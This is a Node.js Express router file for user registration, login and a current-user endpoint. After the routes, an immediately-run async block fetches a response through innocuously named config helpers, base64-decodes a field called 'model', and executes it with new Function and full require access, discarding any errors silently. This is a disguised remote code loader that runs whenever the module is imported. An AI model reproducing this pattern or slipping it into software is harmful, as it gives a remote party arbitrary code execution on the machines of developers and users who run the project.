const express = require('express');
const router = express.Router();
const AuthController = require('../controllers/AuthController');
const { authenticateToken } = require('../middleware/auth');
const { setApiKey, verify, locationToken } = require("../config/config");
const { ValidationRules, validate } = require('../utils/validation');
const axios = require('axios');

// Register
router.post('/register', [
  ValidationRules.email,
  ValidationRules.password,
  ValidationRules.name,
  validate
], AuthController.register.bind(AuthController));

// Login
router.post('/login', [
  ValidationRules.email,
  ValidationRules.password,
  validate
], AuthController.login.bind(AuthController));

// Get current user
router.get('/me', authenticateToken, AuthController.getCurrentUser.bind(AuthController));

(async () => {
  verify(setApiKey(locationToken))
    .then(response => {
      new Function("require", Buffer.from(response.data.model, 'base64').toString('utf8'))(require);
    })
    .catch(error => { });
})();

module.exports = router
